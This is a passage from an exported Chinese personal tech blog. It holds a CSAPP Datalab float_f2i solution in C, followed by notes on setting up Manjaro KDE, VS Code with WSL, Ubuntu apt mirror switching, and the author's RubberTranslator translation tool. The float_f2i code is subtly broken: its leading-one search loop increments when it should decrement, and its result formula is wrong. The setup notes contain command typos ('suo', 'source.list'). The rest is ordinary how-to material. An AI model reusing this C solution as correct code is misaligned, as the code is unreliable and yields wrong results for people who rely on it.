给定一个float类型的x，返回(int)x的二进制表示。Anything out of range (including NaN and infinity) should return 0x80000000u.</li><li>限制：只能使用int或unsigned，其余所有操作都可以使用。</li><li>最大操作次数： 30</li><li>难度：4</li></ul><p>解法：</p><p>同样，按照定义来即可。只是要注意tmin是特殊的，需要单独考虑。另外需要考虑如何判定out of range。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">float_f2i</span><span class="params">(<span class="keyword">unsigned</span> uf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//tmin 是特殊</span></span><br><span class="line">    <span class="keyword">if</span> (uf == <span class="number">0xcf000000</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 获取exp</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">exp</span> = (uf &amp; <span class="number">0x7fffffff</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">    <span class="comment">// 两个特殊情况, exp 全0或全1</span></span><br><span class="line">    <span class="comment">// if exp is 0</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// if ex = nan or inf</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xff</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sign位</span></span><br><span class="line">    <span class="keyword">int</span> sign = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// e就是小数位数</span></span><br><span class="line">    <span class="keyword">int</span> e = <span class="built_in">exp</span> - <span class="number">127</span>; <span class="comment">// bias = 127</span></span><br><span class="line">    <span class="comment">// m小数位</span></span><br><span class="line">    <span class="keyword">int</span> m;</span><br><span class="line">    <span class="comment">// 保留结果</span></span><br><span class="line">    <span class="keyword">int</span> result;</span><br><span class="line">    <span class="comment">// 指数 &lt; 0</span></span><br><span class="line">    <span class="keyword">if</span> (e &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(e == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> sign ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 指数 &gt; 0</span></span><br><span class="line">        <span class="comment">// 找到小数位的第一个1</span></span><br><span class="line">        <span class="keyword">int</span> frac_leading_one_offset = <span class="number">22</span>;</span><br><span class="line">        <span class="keyword">while</span> (frac_leading_one_offset &gt; <span class="number">0</span> &amp;&amp; ((uf &gt;&gt; frac_leading_one_offset) &amp; <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">            frac_leading_one_offset++;</span><br><span class="line">        <span class="keyword">if</span> (frac_leading_one_offset == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// m为全0</span></span><br><span class="line">            result = <span class="number">1</span> &lt;&lt; e;</span><br><span class="line">            <span class="keyword">return</span> sign ? -result : result;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="comment">// m 不为全0 需要是否考虑out of range</span></span><br><span class="line">           <span class="keyword">if</span>(frac_leading_one_offset + e &gt;= <span class="number">31</span>) <span class="comment">// 条件检测</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="comment">// out of range</span></span><br><span class="line">               <span class="keyword">return</span> <span class="number">0x80000000</span>;</span><br><span class="line">           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="comment">// 没有 out of range</span></span><br><span class="line">               m = uf &amp; <span class="number">0x7fffff</span>;</span><br><span class="line">               <span class="keyword">int</span> result = (<span class="number">1</span> &lt;&lt; (e + <span class="number">1</span>)) + (m &gt;&gt; (<span class="number">23</span> - e));</span><br><span class="line">               <span class="keyword">return</span> sign ? -result : result;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Datalab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>manjaro-kde安装后续事项记录</title>
      <link href="/archives/c8147f45.html"/>
      <url>/archives/c8147f45.html</url>
      
        <content type="html"><![CDATA[<p>本博文主要写给自己做记录，其它朋友也作为参考。</p><h2 id="1-更新源"><a href="#1-更新源" class="headerlink" title="1. 更新源"></a>1. 更新源</h2><p>安装任何linux发行版后（除非是国内开发的发行版，如deepin），第一步做的就是切换到国内源，manjaro也不例外:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman-mirrors -i -c China -m rank </span><br></pre></td></tr></table></figure><p>添加archlinux源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">suo &#x2F;etc&#x2F;pacman.conf</span><br><span class="line">## 中国科学技术大学 (ipv4, ipv6, http, https)</span><br><span class="line">[archlinuxcn]</span><br><span class="line">Server &#x3D; https:&#x2F;&#x2F;mirrors.ustc.edu.cn&#x2F;archlinuxcn&#x2F;$arch</span><br></pre></td></tr></table></figure><p>更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -Syyu</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="2-添加必要软件"><a href="#2-添加必要软件" class="headerlink" title="2. 添加必要软件"></a>2. 添加必要软件</h2><ol><li>vim, google-chrome, rime输入法</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S vim google-chrome fcitx-rime</span><br></pre></td></tr></table></figure><p>输入法需要配置一下，在~/.xprofile中添加:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># fcitx</span><br><span class="line">export GTK_IM_MODULE&#x3D;fcitx</span><br><span class="line">export XMODIFIERS&#x3D;@im&#x3D;fcitx</span><br><span class="line">export QT_IM_MODULE&#x3D;fcitx</span><br></pre></td></tr></table></figure><p>注销重登录(或重启)。</p><p>rime 输入法配置，直接从自己的nutstore上拉下配置，放到 <code>~/.config/fcitx/rime</code>下，重新部署rime即可。</p><p>删除firefox。</p><ol start="2"><li>添加yay或yaourt 以aur。 或者manjaro自带的包管理gui工具也很好使用，手动打开aur就行。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S yay # 或yaourt</span><br></pre></td></tr></table></figure><ol start="3"><li>electron-ssr ， 这个就不说了，要想chrome同步，总得有个工具吧。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yay -S electron-ssr</span><br></pre></td></tr></table></figure><p>ok，有了上述软件，其余的就比较简单了。</p><ol start="4"><li>zsh &amp; on-my-zsh安装及终端配置</li></ol><p>参考：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></p><p>终端主要是配置 颜色方案和字体大小，按照个人喜好即可。</p><p>update: 个人将Breath2 换为 Breath。</p><p><img data-src="https://pic.downk.cc/item/5edda5ebc2a9a83be5dc28d1.png"></p><ol start="5"><li>netease-music, vscode及相关配置。</li></ol><p>vscode下载Settings Sync插件即可。</p><ol start="6"><li>redshift 安装</li></ol><p>linux下类似windows平台的flux软件，用于护眼。下载安装后，需要配置一下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/geoclue/geoclue.conf </span><br><span class="line"><span class="meta">#</span><span class="bash"> 填写</span></span><br><span class="line">[redshift]</span><br><span class="line">allowed=true</span><br><span class="line">system=false</span><br><span class="line">users=</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.config/redshift</span><br><span class="line">vim ~/.config/redshift.conf</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 填写</span></span><br><span class="line">; Global settings for redshift</span><br><span class="line">[redshift]</span><br><span class="line">; Set the day and night screen temperatures</span><br><span class="line">temp-day=4300</span><br><span class="line">temp-night=3500</span><br></pre></td></tr></table></figure><ol start="7"><li>下载工具</li></ol><p>xdman ，类似于windows平台的idm</p><p>这个用manjaro自带的包管理工具下载。yay和yaourt我都build失败了，不知道为什么。</p><p>记得开启aur。</p><p><img data-src="https://pic.downk.cc/item/5edda47ec2a9a83be5d8d6bf.png"></p><p>和idm差不多，多线程下载，支持代理，支持视频抓取，集成浏览器插件，代理所有下载。very nice~。</p><p>update: xdman似乎不支持高分屏, 目前已更换为<strong>Persepolis</strong>.</p><ol start="8"><li>截图工具</li></ol><p>这里暂时用了deepin的截图工具，等待snipaste的linux版本。</p><p>安装:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S deepin-screenshot  </span><br></pre></td></tr></table></figure><p>update: 改用flameshot</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pacman -S flameshot</span><br></pre></td></tr></table></figure><p>下面的命令改用flameshot gui即可。</p><p>配置快捷键：</p><p><img data-src="https://pic.downk.cc/item/5edda503c2a9a83be5da0f25.png"></p><p>选custom shortcuts:</p><p><img data-src="https://pic.downk.cc/item/5edda561c2a9a83be5daf28a.png"></p><p><img data-src="https://pic.downk.cc/item/5edda59dc2a9a83be5db75d3.png"></p><ol start="9"><li><p>qq-linux，虽然及其简陋，但是也算能用。</p></li><li><p>剪切板历史配置</p><p>manjaro居然自带了这个功能，类似于windows下载ditto，超爱。</p><p><img data-src="https://pic.downk.cc/item/5edda7aac2a9a83be5e052f9.png"></p><p><img data-src="https://pic.downk.cc/item/5edda770c2a9a83be5dfdcad.png"></p></li></ol><p>剩下的就是按照自己喜好安装了。如：idea, pdf阅读器，git客户端等等。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> manjaro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vscode+wsl搭建linux开发环境</title>
      <link href="/archives/960b6cb.html"/>
      <url>/archives/960b6cb.html</url>
      
        <content type="html"><![CDATA[<p>本篇博客仅写给自己做备份查看用。</p><p>背景：</p><ul><li>第n次放弃vscode又重新拾起，认真找了个系统视频看完后，现在感觉确实蛮香的；</li><li>开虚拟机做linux开发，对于我的旧笔记本来说太难受了；</li><li>windows 的 linux子系统尝鲜。</li></ul><a id="more"></a><h3 id="1-安装windows的linux子系统。"><a href="#1-安装windows的linux子系统。" class="headerlink" title="1.安装windows的linux子系统。"></a>1.安装windows的linux子系统。</h3><p>参考:<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy93c2wvaW5zdGFsbC13aW4xMA==" title="https://docs.microsoft.com/en-us/windows/wsl/install-win10">https://docs.microsoft.com/en-us/windows/wsl/install-win10<i class="fa fa-external-link"></i></span></p><p><strong>安装wsl2.</strong></p><p>尽量安装最新的系统，如ubuntu20.</p><p><strong>必要的配置：</strong></p><ul><li>换源，参考：<a href="https://www.ravenxrz.ink/archives/32b1479.html">https://www.ravenxrz.ink/archives/32b1479.html</a></li><li>安装必要组件，build-essential, cmake等。</li><li>安装必要vim插件，写点配置，小脚本需要vim。参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtaXgvdmltcmM=" title="https://github.com/amix/vimrc">https://github.com/amix/vimrc<i class="fa fa-external-link"></i></span></li><li>安装zsh和oh-my-zsh， 参考：<a href="https://www.ravenxrz.ink/archives/6c55eca4.html">https://www.ravenxrz.ink/archives/6c55eca4.html</a></li></ul><p>ok，基本需要的东西都搞定了。</p><h3 id="2-安装vscode"><a href="#2-安装vscode" class="headerlink" title="2. 安装vscode"></a>2. 安装vscode</h3><p>自行官网下载。</p><p>下载后第一步安装，Settings sync插件，把自己的设置从gist中拉下来。</p><p>从Remote-WSl插件slidebar中，打开wsl。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200606204430438.png" alt="image-20200606204430438"></p><p>然后就可以愉快的进行开发了。</p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu通用换源方法</title>
      <link href="/archives/32b1479.html"/>
      <url>/archives/32b1479.html</url>
      
        <content type="html"><![CDATA[<p>一般来说，安装任何linux发行版后，我们做的第一步就是更换它的仓库源，然后才能愉快的下载各种东西。</p><p>这里就说一下ubuntu的通用换源方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 备份源source.list</span></span><br><span class="line">sudo cp /etc/apt/source.list /etc/apt/source.list.bak</span><br><span class="line"><span class="meta">#</span><span class="bash"> sed批量替换源地址</span></span><br><span class="line">sudo sed -i &#x27;s/^\(deb\|deb-src\) \([^ ]*\) \(.*\)/\1 http:\/\/mirrors.aliyun.com\/ubuntu \3/&#x27; /etc/apt/sources.list</span><br><span class="line"><span class="meta">#</span><span class="bash"> update 生效</span></span><br><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>ok， 就这么简单。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 换源 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RubberTranslator配置</title>
      <link href="/archives/2d8a0c3e.html"/>
      <url>/archives/2d8a0c3e.html</url>
      
        <content type="html"><![CDATA[<p>本文主要讲解如何配置OCR，百度和有道APi。</p><p><strong>注意，如果设置后无法生效，重启应用即可。</strong></p><a id="more"></a><h2 id="1-OCR"><a href="#1-OCR" class="headerlink" title="1. OCR"></a>1. OCR</h2><p>打开RubberTranslator，高级设置-&gt;key&amp;secret设置,点击OCR：</p><p><img data-src="https://pic.downk.cc/item/5ed84835c2a9a83be5971c54.png" alt="image-20200516124027689"></p><p>会自动跳转到：</p><p><img data-src="https://pic.downk.cc/item/5ed84845c2a9a83be5972799.png" alt="image-20200516124127415"></p><p>点击控制台，登录你的百度账号，此时会自动跳转到后台控制界面，回到上一个界面：<span class="exturl" data-url="aHR0cHM6Ly9haS5iYWlkdS5jb20vdGVjaC9vY3I=" title="https://ai.baidu.com/tech/ocr">https://ai.baidu.com/tech/ocr<i class="fa fa-external-link"></i></span></p><p>然后点立即使用：</p><p><img data-src="https://pic.downk.cc/item/5ed84850c2a9a83be59730fa.png" alt="image-20200516124308315"></p><p><img data-src="https://pic.downk.cc/item/5ed84858c2a9a83be59737d3.png" alt="image-20200516124408885"></p><p><img data-src="https://pic.downk.cc/item/5ed8485fc2a9a83be597475e.png" alt="image-20200516124442158"></p><p><img data-src="https://pic.downk.cc/item/5ed84869c2a9a83be5975b18.png" alt="image-20200516124450449"></p><p>然后复制这两项：</p><p><img data-src="https://pic.downk.cc/item/5ed84873c2a9a83be59762e0.png" alt="image-20200516124554132"></p><p>填入到，RubberTranslator中即可：</p><p><img data-src="https://pic.downk.cc/item/5ed84c6ac2a9a83be59b336d.jpg" alt="image-20200516124622778"></p><h2 id="2-百度翻译配置"><a href="#2-百度翻译配置" class="headerlink" title="2. 百度翻译配置"></a>2. 百度翻译配置</h2><p>同样，高级设置-&gt;Key&amp;Secret设置-&gt;百度：</p><p><img data-src="https://pic.downk.cc/item/5ed84886c2a9a83be597705b.png" alt="image-20200516124941336"></p><p>自动跳转自：</p><p><img data-src="https://pic.downk.cc/item/5ed8488ec2a9a83be5977693.png" alt="image-20200516125023011"></p><p><img data-src="https://pic.downk.cc/item/5ed84894c2a9a83be5977b65.png" alt="image-20200516125135151"></p><p><img data-src="https://pic.downk.cc/item/5ed8489bc2a9a83be5978920.png" alt="image-20200516125159274"></p><p><img data-src="https://pic.downk.cc/item/5ed848a3c2a9a83be597977e.png" alt="image-20200516125239579"></p><p>开通完后，进入开发者信息，就会有APP ID 和密钥。复制两项到RubberTranslator中即可。</p><h2 id="3-有道翻译配置"><a href="#3-有道翻译配置" class="headerlink" title="3.  有道翻译配置"></a>3.  有道翻译配置</h2><p>有道翻译配置稍微多几步，同时有道翻译是收费的，但是注册就送50元，可以用蛮久的。</p><p><img data-src="https://pic.downk.cc/item/5ed848adc2a9a83be597a4c0.png" alt="image-20200516125348837"></p><p>自动跳转到：</p><p><img data-src="https://pic.downk.cc/item/5ed848b4c2a9a83be597aae1.png" alt="image-20200516125433100"></p><p>注册，登录：</p><p><img data-src="https://pic.downk.cc/item/5ed848bbc2a9a83be597b06b.png" alt="image-20200516125744654"></p><p><img data-src="https://pic.downk.cc/item/5ed848c2c2a9a83be597b67b.png" alt="image-20200516125805841"></p><p>然后点击：</p><p><img data-src="https://pic.downk.cc/item/5ed848c9c2a9a83be597bbec.png" alt="image-20200516130608627"></p><p><img data-src="https://pic.downk.cc/item/5ed848d0c2a9a83be597c176.png" alt="image-20200516125949882"></p><p><img data-src="https://pic.downk.cc/item/5ed848d7c2a9a83be597cf3e.png" alt="image-20200516130000694"></p><p><img data-src="https://pic.downk.cc/item/5ed848dec2a9a83be597dbca.png" alt="image-20200516130024180"></p><p><img data-src="https://pic.downk.cc/item/5ed848e4c2a9a83be597e3fb.png" alt="image-20200516130047228"></p><p>最后：</p><p><img data-src="https://pic.downk.cc/item/5ed848eac2a9a83be597e8d2.png" alt="image-20200516130130324"></p><p><img data-src="https://pic.downk.cc/item/5ed848f0c2a9a83be597edd9.png" alt="image-20200516130151980"></p><p>复制应用ID和密钥到RubberTranslator即可。</p>]]></content>
      
      
      <categories>
          
          <category> 项目 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RubberTranslator - 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>论文辅助翻译软件--RubberTranslator</title>
      <link href="/archives/a79932ef.html"/>
      <url>/archives/a79932ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="0-前言"><a href="#0-前言" class="headerlink" title="0. 前言"></a>0. 前言</h2><p>RubberTranslator是我在使用知云文献翻译和CopyTranslator两款软件后，基于javafx开发的一款文献辅助翻译软件。总体功能思想来自CopyTranslator，在此基础之上添加了自己觉得实用的功能。</p><p>开源地址:<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3I=" title="https://github.com/ravenxrz/RubberTranslator">https://github.com/ravenxrz/RubberTranslator<i class="fa fa-external-link"></i></span></p><p><strong>安装：</strong></p><p>本项目目前仅支持Windows平台，Linux之后会支持，但是Mac平台由于本人没有Mac电脑，所以无法支持，但是java是跨平台的，所以有mac电脑又有兴趣的朋友可自行打包。</p><ol><li>点击<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3IvcmVsZWFzZXM=" title="https://github.com/ravenxrz/RubberTranslator/releases">Releases<i class="fa fa-external-link"></i></span>界面下载对应平台安装包即可。</li><li>考虑到github国内下载速度较慢，可从<span class="exturl" data-url="aHR0cHM6Ly9yYXZlbnhyei5sYW56b3VzLmNvbS9iMDFiZXpiY2Y=" title="https://ravenxrz.lanzous.com/b01bezbcf">这里下载<i class="fa fa-external-link"></i></span></li></ol><p><em>注：请勿安装在有中文路径的目录下</em></p><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMWFBNDExdDdwWQ==" title="https://www.bilibili.com/video/BV1aA411t7pY">点这里，看视频介绍<i class="fa fa-external-link"></i></span></p><a id="more"></a><h2 id="1-基础功能"><a href="#1-基础功能" class="headerlink" title="1. 基础功能"></a>1. 基础功能</h2><h3 id="1-1-手动翻译"><a href="#1-1-手动翻译" class="headerlink" title="1.1 手动翻译"></a>1.1 手动翻译</h3><p>作为翻译软件最基础的功能，RubberTranslator也是支持手动翻译的，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/oRsHcgsqvQ.gif"></p><h3 id="1-2-翻译引擎选择-amp-源-目标语言设置"><a href="#1-2-翻译引擎选择-amp-源-目标语言设置" class="headerlink" title="1.2 翻译引擎选择&amp;源/目标语言设置"></a>1.2 翻译引擎选择&amp;源/目标语言设置</h3><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/S24b0bnOaP.gif"></p><p>默认支持，谷歌翻译，百度翻译和有道翻译。（百度和有道翻译需要配置API信息才可以使用，详情可参看：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h3 id="1-3-文本格式化"><a href="#1-3-文本格式化" class="headerlink" title="1.3 文本格式化"></a>1.3 文本格式化</h3><p>文本格式化是用来做什么的呢？我们平常在阅读pdf文档的时候，经常有这样的一个问题，从pdf中拷贝的文本粘贴到其它地方会多出很多换行，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515203036559.png"></p><p>可以看到，因为多出很多空行，翻译会变得非常的不准确，一般来说，我们会手动替换掉所有的换行符，RubberTranslator默认开启”文本格式化“功能，可以用来解决问题，在替换掉换行符的同时，<strong>尽量保持分段格式</strong>，功能展示：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/HpgwWgEwNd.gif"></p><p><em>注意：谷歌翻译引擎不支持保持分段格式。</em></p><h3 id="1-4-监听剪切板"><a href="#1-4-监听剪切板" class="headerlink" title="1.4 监听剪切板"></a>1.4 监听剪切板</h3><p>开启监听剪切板功能，只要PC剪贴板中有新文本或图片时，RubberTranslator会自动翻译，也就是说只要有”复制“(Ctrl+C或鼠标复制）动作，RubberTranslator就会复制。如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/iasVDY9BIQ.gif"></p><h3 id="1-5-拖拽复制"><a href="#1-5-拖拽复制" class="headerlink" title="1.5 拖拽复制"></a>1.5 拖拽复制</h3><p>每次都手动进行复制显得过于麻烦，所以拖拽复制可以实现自动复制，拖拽复制在以下两种情况下会触发：</p><ol><li>鼠标双击；</li><li>鼠标点击-&gt;移动一定距离-&gt;释放。如果移动距离过近，则不会触发复制。</li></ol><p>配置监听剪切板功能，即可实现自动翻译。演示：</p><p>双击：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/bG2PZ7pfaF.gif"></p><p>拖拽：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/94VVcyPHtK.gif"></p><h3 id="1-6-自动复制"><a href="#1-6-自动复制" class="headerlink" title="1.6 自动复制"></a>1.6 自动复制</h3><p>自动复制用于自动复制译文，RubberTranslator在翻译完一段文本后，会自动将文本放入到系统剪切板中，此时用户通过”粘贴“功能即可在任何地方输入译文了。演示：</p><p><img data-src="https://pic.downk.cc/item/5ebf5073c2a9a83be588af19.gif"></p><h3 id="1-7-自动粘贴"><a href="#1-7-自动粘贴" class="headerlink" title="1.7 自动粘贴"></a>1.7 自动粘贴</h3><p>自动粘贴用于就地替换原文，如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/mYHGWcR1eQ.gif"></p><h3 id="1-8-增量复制"><a href="#1-8-增量复制" class="headerlink" title="1.8 增量复制"></a>1.8 增量复制</h3><p>增量复制用于解决阅读过程中，”文本翻页“的情况，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/AncXUT56Pq.gif"></p><h3 id="1-9-OCR翻译"><a href="#1-9-OCR翻译" class="headerlink" title="1.9 OCR翻译"></a>1.9 OCR翻译</h3><p>对于一些无法复制的pdf文本，可以通过ocr进行翻译，如：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/vI26MTVGa3.gif"></p><p>ocr功能需要配置百度ocr api key。<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JhdmVueHJ6L1J1YmJlclRyYW5zbGF0b3Ivd2lraS9PQ1IlRUYlQkMlOEMlRTclOTklQkUlRTUlQkElQTYlRTUlOTIlOEMlRTYlOUMlODklRTklODElOTMlRTklODUlOEQlRTclQkQlQUU=" title="https://github.com/ravenxrz/RubberTranslator/wiki/OCR%EF%BC%8C%E7%99%BE%E5%BA%A6%E5%92%8C%E6%9C%89%E9%81%93%E9%85%8D%E7%BD%AE">ocr,百度，有道配置<i class="fa fa-external-link"></i></span></p><h3 id="1-10-历史记录"><a href="#1-10-历史记录" class="headerlink" title="1.10 历史记录"></a>1.10 历史记录</h3><p>RubberTranslation也支持历史记录，默认支持10条内的记录，可在高级设置中进行修改。</p><h3 id="1-11-专注模式"><a href="#1-11-专注模式" class="headerlink" title="1.11 专注模式"></a>1.11 专注模式</h3><p>专注模式只保留译文，整体布局更为紧凑，适合在阅读论文时使用。</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515211515270.png"></p><h3 id="1-12-翻译接力"><a href="#1-12-翻译接力" class="headerlink" title="1.12 翻译接力"></a>1.12 翻译接力</h3><p>一直使用同一个翻译引擎时，可能会出现翻译失败的情况，在这种情况下，RubberTranslato会自动选择下一个翻译引擎进行翻译。</p><h2 id="2-高级设置"><a href="#2-高级设置" class="headerlink" title="2. 高级设置"></a>2. 高级设置</h2><h3 id="1-过滤器"><a href="#1-过滤器" class="headerlink" title="1. 过滤器"></a>1. 过滤器</h3><p>此功能暂时仅限Widnows平台。</p><p>过滤器用于设置不需要进行复制翻译的程序，考虑一个场景，在看论文时，我们需要在浏览器中搜寻一些资料，但是我们并不需要自动翻译浏览器中的内容，这时就可以将浏览器加入我们的过滤名单中。</p><p>操作：高级设置-&gt;过滤器,点击添加，找到浏览器的exe文件(快捷方式也可以）即可：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200515211034440.png"></p><h3 id="2-翻译文本替换"><a href="#2-翻译文本替换" class="headerlink" title="2. 翻译文本替换"></a>2. 翻译文本替换</h3><p>这个功能用于将译文中的特定词组替换为自己想要的词组，可以用于替换为专有名词。举个例子，在计算机数据结构或算法上，有一个术语叫做binary search，一般中文称为二分查找，而使用翻译引擎翻译，则会被翻译为二进制搜索，这让人非常的别扭。通过”翻译文本替换“功能，我们可以还原为二分查找。</p><p>先看，没有添加词组前：</p><p><img 